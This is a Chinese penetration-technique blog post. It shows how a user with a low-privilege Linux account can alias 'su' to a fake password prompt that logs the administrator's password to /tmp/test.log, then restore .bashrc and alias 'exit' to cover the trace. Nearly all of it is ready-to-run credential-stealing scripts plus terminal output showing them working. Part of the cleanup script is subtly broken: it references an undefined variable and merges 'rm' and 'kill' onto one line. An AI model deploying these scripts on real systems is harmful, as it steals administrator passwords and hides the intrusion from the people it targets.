    Linux利用别名抓取账户切换时密码

    手法技巧 Linux 渗透技巧
    发布时间 : 2020-07-09 20:08
    字数:838 阅读 :
    1. 实现思路
    2. 具体实现（方法1）
    3. 方法2

    实现思路

    在Linux系统下，有个 ~/.bashrc文件

    # .bashrc

# User specific aliases and functions

alias rm='rm -i'
alias cp='cp -i'
alias mv='mv -i'
alias ll='ls -all'    # 这是我刚刚添加的，
# Source global definitions
if [ -f /etc/bashrc ]; then
        . /etc/bashrc
fi
    source ~/.bashrc   # 重启环境变量之后别名才能生效，或直接注销当前账户也行

    此时在终端输入 ‘ll’ 相当于输入ls -all

    [root@localhost ~]# ll
总用量 36
dr-xr-x---.  2 root root  175 7月   9 09:03 .

-rw-r--r--.  1 root root  194 7月   9 09:03 .bashrc

    输入ll的时候相当于ls -all ，在渗透测试时拿到低权限用户，不考虑提权，可以对此用户进行一个账户密码抓取

    具体实现（方法1）

    看一下当低权限用户使用su 切换用户时，正常的信息显示

    [Knsec@localhost ~]$ su - root
Password: 
su: Authentication failure
[Knsec@localhost ~]$

    编写shell脚本，并把抓到的密码存到想存的地方

    #!/bin/bash
echo -e "Password: \c"  # \c 为不换行
read -s pass
echo $pass >> /tmp/test.log
echo ""
echo "su: Authentication failure"
    chmod 755 1.sh    # 添加权限

    嗯。。。 有点这个意思了

    利用上面说到的别名进行修改。记得重启环境变量

    source ~/.bashrc

    但是这样管理员会一直无法认证成功，最后导致暴露。在脚本原有的基础上添加

    #!/bin/bash
echo -e "Password: \c"  # \c 为不换行
read -s pass
echo $pass >> /tmp/test.log
echo ""
echo "su: Authentication failure"
cp -p /tmp/.bashrc .bashrc
rm /tmp/.bashrc
source ~/.bashrc

    把源文件备份至指定可写目录中

    然后运行

    失败一次之后，管理员可能会觉得是自己密码打错了，此时我们已经抓了密码。

    方法2

    此时存在一个问题，当用户退出时，如果习惯使用exit退出终端，需要输入两边才可能退出

    此时需要分析管理员的习惯，是习惯直接关掉终端还是习惯使用exit退出终端之后再关掉窗口

    如果习惯使用exit则使用下面方法

    备份两个源.bashrc文件

    [Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc
[Knsec@localhost ~]$ cp -p .bashrc /tmp/.bashrc_tmp

    修改.bashrc_tmp

    alias exit='./2.sh'

    修改1.sh

    #!/bin/bash
echo -e "Password: \c"  # \c 为不换行
read -s pass
echo $pass >> /tmp/test.log
echo ""
echo "su: Authentication failure"
cp -p /tmp/.bashrc_tmp .bashrc
rm /tmp/.bashrc_tmp
bash

    修改2.sh

    #!/bin/bash
#  寻找su恶意脚本并kill掉，实现一次exit就退出
ps_result=`ps -ef | grep "/bin/bash ./1.sh"` 
pid=`echo $tmp | awk '{print $3}'`
cp -p /tmp/.bashrc .bashrc 
rm /tmp/.bashrc kill -9 $pid

    效果：

    [Knsec@localhost ~]$ su - root
Password: 
su: Authentication failure
[Knsec@localhost ~]$ su - root
Password：
Last login：Thu Jul 9 09:42:40 EDT 2020 on pts/0 
[root@localhost ~]# exit
logout
[Knsec@localhost ~]$

    至此，管理员习惯输入exit退出终端时，执行完恶意脚本，输入一次exit即可退出终端

    如果是管理员习惯直接关掉窗口，则使用方法1
